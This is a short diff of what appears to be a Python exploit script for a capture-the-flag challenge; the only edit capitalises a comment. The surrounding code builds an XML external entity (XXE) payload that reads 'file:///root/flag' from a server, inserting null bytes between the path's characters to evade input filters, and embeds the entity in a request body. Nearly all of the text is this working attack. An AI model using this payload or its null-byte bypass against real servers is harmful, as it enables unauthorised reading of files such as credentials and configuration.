@@ -7,7 +7,7 @@ PORT = 8031
 TIMEOUT = 10
 
 # Building XML with null bytes inside the SYSTEM path
-#  keep outer XML as utf-8 but insert literal \x00 bytes into the SYSTEM URI bytes
+# Keep outer XML as utf-8 but insert literal \x00 bytes into the SYSTEM URI bytes
 pre = '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///'
 mid = b"".join([c.encode() + b"\x00" for c in "root/flag"])  # r\x00o\x00o...
 post = b'"> ]><request><id>&xxe;</id></request>'
